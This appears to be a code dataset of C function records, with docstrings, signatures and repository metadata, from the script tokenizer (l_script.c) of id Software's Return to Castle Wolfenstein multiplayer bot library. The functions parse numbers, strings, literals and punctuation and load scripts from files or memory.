{"docstring": "//end of the function ReadSignedFloat\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "signed long int ReadSignedInt( script_t *script )", "code": "{\n\ttoken_t token;\n\tsigned long int sign = 1;\n\n\tPS_ExpectAnyToken( script, &token );\n\tif ( !strcmp( token.string, \"-\" ) ) {\n\t\tsign = -1;\n\t\tPS_ExpectTokenType( script, TT_NUMBER, TT_INTEGER, &token );\n\t} //end if\n\telse if ( token.type != TT_NUMBER || token.subtype == TT_FLOAT ) {\n\t\tScriptError( script, \"expected integer value, found %s\\n\", token.string );\n\t} //end else if\n\treturn sign * token.intvalue;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_NextWhiteSpaceChar\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "void StripDoubleQuotes( char *string )", "code": "{\n\tif ( *string == '\\\"' ) {\n\t\tstrcpy( string, string + 1 );\n\t} //end if\n\tif ( string[strlen( string ) - 1] == '\\\"' ) {\n\t\tstring[strlen( string ) - 1] = '\\0';\n\t} //end if\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void PS_CreatePunctuationTable( script_t *script, punctuation_t *punctuations )", "code": "{\n\tint i;\n\tpunctuation_t *p, *lastp, *newp;\n\n\t//get memory for the table\n\tif ( !script->punctuationtable ) {\n\t\tscript->punctuationtable = (punctuation_t **)\n\t\t\t\t\t\t\t\t   GetMemory( 256 * sizeof( punctuation_t * ) );\n\t}\n\tmemset( script->punctuationtable, 0, 256 * sizeof( punctuation_t * ) );\n\t//add the punctuations in the list to the punctuation table\n\tfor ( i = 0; punctuations[i].p; i++ )\n\t{\n\t\tnewp = &punctuations[i];\n\t\tlastp = NULL;\n\t\t//sort the punctuations in this table entry on length (longer punctuations first)\n\t\tfor ( p = script->punctuationtable[(unsigned int) newp->p[0]]; p; p = p->next )\n\t\t{\n\t\t\tif ( strlen( p->p ) < strlen( newp->p ) ) {\n\t\t\t\tnewp->next = p;\n\t\t\t\tif ( lastp ) {\n\t\t\t\t\tlastp->next = newp;\n\t\t\t\t} else { script->punctuationtable[(unsigned int) newp->p[0]] = newp;}\n\t\t\t\tbreak;\n\t\t\t} //end if\n\t\t\tlastp = p;\n\t\t} //end for\n\t\tif ( !p ) {\n\t\t\tnewp->next = NULL;\n\t\t\tif ( lastp ) {\n\t\t\t\tlastp->next = newp;\n\t\t\t} else { script->punctuationtable[(unsigned int) newp->p[0]] = newp;}\n\t\t} //end if\n\t} //end for\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "script_t *LoadScriptFile( const char *filename )", "code": "{\n#ifdef BOTLIB\n\tfileHandle_t fp;\n\tchar pathname[MAX_QPATH];\n#else\n\tFILE *fp;\n#endif\n\tint length;\n\tvoid *buffer;\n\tscript_t *script;\n\n#ifdef BOTLIB\n\tif ( strlen( basefolder ) ) {\n\t\tCom_sprintf( pathname, sizeof( pathname ), \"%s/%s\", basefolder, filename );\n\t} else {\n\t\tCom_sprintf( pathname, sizeof( pathname ), \"%s\", filename );\n\t}\n\tlength = botimport.FS_FOpenFile( pathname, &fp, FS_READ );\n\tif ( !fp ) {\n\t\treturn NULL;\n\t}\n#else\n\tfp = fopen( filename, \"rb\" );\n\tif ( !fp ) {\n\t\treturn NULL;\n\t}\n\n\tlength = FileLength( fp );\n#endif\n\n\tbuffer = GetClearedMemory( sizeof( script_t ) + length + 1 );\n\tscript = (script_t *) buffer;\n\tmemset( script, 0, sizeof( script_t ) );\n\tstrcpy( script->filename, filename );\n\tscript->buffer = (char *) buffer + sizeof( script_t );\n\tscript->buffer[length] = 0;\n\tscript->length = length;\n\t//pointer in script buffer\n\tscript->script_p = script->buffer;\n\t//pointer in script buffer before reading token\n\tscript->lastscript_p = script->buffer;\n\t//pointer to end of script buffer\n\tscript->end_p = &script->buffer[length];\n\t//set if there's a token available in script->token\n\tscript->tokenavailable = 0;\n\t//\n\tscript->line = 1;\n\tscript->lastline = 1;\n\t//\n\tSetScriptPunctuations( script, NULL );\n\t//\n#ifdef BOTLIB\n\tbotimport.FS_Read( script->buffer, length, fp );\n\tbotimport.FS_FCloseFile( fp );\n#else\n\tif ( fread( script->buffer, length, 1, fp ) != 1 ) {\n\t\tFreeMemory( buffer );\n\t\tscript = NULL;\n\t} //end if\n\tfclose( fp );\n#endif\n\t//\n\tscript->length = COM_Compress( script->buffer );\n\n\treturn script;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_ExpectAnyToken\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_CheckTokenString( script_t *script, char *string )", "code": "{\n\ttoken_t tok;\n\n\tif ( !PS_ReadToken( script, &tok ) ) {\n\t\treturn 0;\n\t}\n\t//if the token is available\n\tif ( !strcmp( tok.string, string ) ) {\n\t\treturn 1;\n\t}\n\t//token not available\n\tscript->script_p = script->lastscript_p;\n\treturn 0;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function LoadScriptFile\n//============================================================================\n//\n// Parameter:\t\t\t-\n// Returns:\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "script_t *LoadScriptMemory( char *ptr, int length, char *name )", "code": "{\n\tvoid *buffer;\n\tscript_t *script;\n\n\tbuffer = GetClearedMemory( sizeof( script_t ) + length + 1 );\n\tscript = (script_t *) buffer;\n\tmemset( script, 0, sizeof( script_t ) );\n\tstrcpy( script->filename, name );\n\tscript->buffer = (char *) buffer + sizeof( script_t );\n\tscript->buffer[length] = 0;\n\tscript->length = length;\n\t//pointer in script buffer\n\tscript->script_p = script->buffer;\n\t//pointer in script buffer before reading token\n\tscript->lastscript_p = script->buffer;\n\t//pointer to end of script buffer\n\tscript->end_p = &script->buffer[length];\n\t//set if there's a token available in script->token\n\tscript->tokenavailable = 0;\n\t//\n\tscript->line = 1;\n\tscript->lastline = 1;\n\t//\n\tSetScriptPunctuations( script, NULL );\n\t//\n\tmemcpy( script->buffer, ptr, length );\n\t//\n\treturn script;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function ScriptWarning\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void SetScriptPunctuations( script_t *script, punctuation_t *p )", "code": "{\n#ifdef PUNCTABLE\n\tif ( p ) {\n\t\tPS_CreatePunctuationTable( script, p );\n\t} else { PS_CreatePunctuationTable( script, default_punctuations );}\n#endif //PUNCTABLE\n\tif ( p ) {\n\t\tscript->punctuations = p;\n\t} else { script->punctuations = default_punctuations;}\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_CreatePunctuationTable\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "char *PunctuationFromNum( script_t *script, int num )", "code": "{\n\tint i;\n\n\tfor ( i = 0; script->punctuations[i].p; i++ )\n\t{\n\t\tif ( script->punctuations[i].n == num ) {\n\t\t\treturn script->punctuations[i].p;\n\t\t}\n\t} //end for\n\treturn \"unkown punctuation\";\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_ReadEscapeCharacter\n//============================================================================\n// Reads C-like string. Escape characters are interpretted.\n// Quotes are included with the string.\n// Reads two strings with a white space between them as one string.\n//\n// Parameter:\t\t\t\tscript\t\t: script to read from\n//\t\t\t\t\t\t\t\ttoken\t\t\t: buffer to store the string\n// Returns:\t\t\t\t\tqtrue when a string was read succesfully\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_ReadString( script_t *script, token_t *token, int quote )", "code": "{\n\tint len, tmpline;\n\tchar *tmpscript_p;\n\n\tif ( quote == '\\\"' ) {\n\t\ttoken->type = TT_STRING;\n\t} else { token->type = TT_LITERAL;}\n\n\tlen = 0;\n\t//leading quote\n\ttoken->string[len++] = *script->script_p++;\n\t//\n\twhile ( 1 )\n\t{\n\t\t//minus 2 because trailing double quote and zero have to be appended\n\t\tif ( len >= MAX_TOKEN - 2 ) {\n\t\t\tScriptError( script, \"string longer than MAX_TOKEN = %d\", MAX_TOKEN );\n\t\t\treturn 0;\n\t\t} //end if\n\t\t  //if there is an escape character and\n\t\t  //if escape characters inside a string are allowed\n\t\tif ( *script->script_p == '\\\\' && !( script->flags & SCFL_NOSTRINGESCAPECHARS ) ) {\n\t\t\tif ( !PS_ReadEscapeCharacter( script, &token->string[len] ) ) {\n\t\t\t\ttoken->string[len] = 0;\n\t\t\t\treturn 0;\n\t\t\t} //end if\n\t\t\tlen++;\n\t\t} //end if\n\t\t  //if a trailing quote\n\t\telse if ( *script->script_p == quote ) {\n\t\t\t//step over the double quote\n\t\t\tscript->script_p++;\n\t\t\t//if white spaces in a string are not allowed\n\t\t\tif ( script->flags & SCFL_NOSTRINGWHITESPACES ) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t//\n\t\t\ttmpscript_p = script->script_p;\n\t\t\ttmpline = script->line;\n\t\t\t//read unusefull stuff between possible two following strings\n\t\t\tif ( !PS_ReadWhiteSpace( script ) ) {\n\t\t\t\tscript->script_p = tmpscript_p;\n\t\t\t\tscript->line = tmpline;\n\t\t\t\tbreak;\n\t\t\t} //end if\n\t\t\t  //if there's no leading double qoute\n\t\t\tif ( *script->script_p != quote ) {\n\t\t\t\tscript->script_p = tmpscript_p;\n\t\t\t\tscript->line = tmpline;\n\t\t\t\tbreak;\n\t\t\t} //end if\n\t\t\t  //step over the new leading double quote\n\t\t\tscript->script_p++;\n\t\t} //end if\n\t\telse\n\t\t{\n\t\t\tif ( *script->script_p == '\\0' ) {\n\t\t\t\ttoken->string[len] = 0;\n\t\t\t\tScriptError( script, \"missing trailing quote\" );\n\t\t\t\treturn 0;\n\t\t\t} //end if\n\t\t\tif ( *script->script_p == '\\n' ) {\n\t\t\t\ttoken->string[len] = 0;\n\t\t\t\tScriptError( script, \"newline inside string %s\", token->string );\n\t\t\t\treturn 0;\n\t\t\t} //end if\n\t\t\ttoken->string[len++] = *script->script_p++;\n\t\t} //end else\n\t} //end while\n\t  //trailing quote\n\ttoken->string[len++] = quote;\n\t//end string with a zero\n\ttoken->string[len] = '\\0';\n\t//the sub type is the length of the string\n\ttoken->subtype = len;\n\treturn 1;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function StripSingleQuotes\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "long double ReadSignedFloat( script_t *script )", "code": "{\n\ttoken_t token;\n\tlong double sign = 1;\n\n\tPS_ExpectAnyToken( script, &token );\n\tif ( !strcmp( token.string, \"-\" ) ) {\n\t\tsign = -1;\n\t\tPS_ExpectTokenType( script, TT_NUMBER, 0, &token );\n\t} //end if\n\telse if ( token.type != TT_NUMBER ) {\n\t\tScriptError( script, \"expected float value, found %s\\n\", token.string );\n\t} //end else if\n\treturn sign * token.floatvalue;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_ReadNumber\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_ReadLiteral( script_t *script, token_t *token )", "code": "{\n\ttoken->type = TT_LITERAL;\n\t//first quote\n\ttoken->string[0] = *script->script_p++;\n\t//check for end of file\n\tif ( !*script->script_p ) {\n\t\tScriptError( script, \"end of file before trailing \\'\" );\n\t\treturn 0;\n\t} //end if\n\t  //if it is an escape character\n\tif ( *script->script_p == '\\\\' ) {\n\t\tif ( !PS_ReadEscapeCharacter( script, &token->string[1] ) ) {\n\t\t\treturn 0;\n\t\t}\n\t} //end if\n\telse\n\t{\n\t\ttoken->string[1] = *script->script_p++;\n\t} //end else\n\t  //check for trailing quote\n\tif ( *script->script_p != '\\'' ) {\n\t\tScriptWarning( script, \"too many characters in literal, ignored\" );\n\t\twhile ( *script->script_p &&\n\t\t\t\t*script->script_p != '\\'' &&\n\t\t\t\t*script->script_p != '\\n' )\n\t\t{\n\t\t\tscript->script_p++;\n\t\t} //end while\n\t\tif ( *script->script_p == '\\'' ) {\n\t\t\tscript->script_p++;\n\t\t}\n\t} //end if\n\t  //store the trailing quote\n\ttoken->string[2] = *script->script_p++;\n\t//store trailing zero to end the string\n\ttoken->string[3] = '\\0';\n\t//the sub type is the integer literal value\n\ttoken->subtype = token->string[1];\n\t//\n\treturn 1;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_CheckTokenString\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_CheckTokenType( script_t *script, int type, int subtype, token_t *token )", "code": "{\n\ttoken_t tok;\n\n\tif ( !PS_ReadToken( script, &tok ) ) {\n\t\treturn 0;\n\t}\n\t//if the type matches\n\tif ( tok.type == type &&\n\t\t ( tok.subtype & subtype ) == subtype ) {\n\t\tmemcpy( token, &tok, sizeof( token_t ) );\n\t\treturn 1;\n\t} //end if\n\t  //token is not available\n\tscript->script_p = script->lastscript_p;\n\treturn 0;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_CheckTokenType\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_SkipUntilString( script_t *script, char *string )", "code": "{\n\ttoken_t token;\n\n\twhile ( PS_ReadToken( script, &token ) )\n\t{\n\t\tif ( !strcmp( token.string, string ) ) {\n\t\t\treturn 1;\n\t\t}\n\t} //end while\n\treturn 0;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
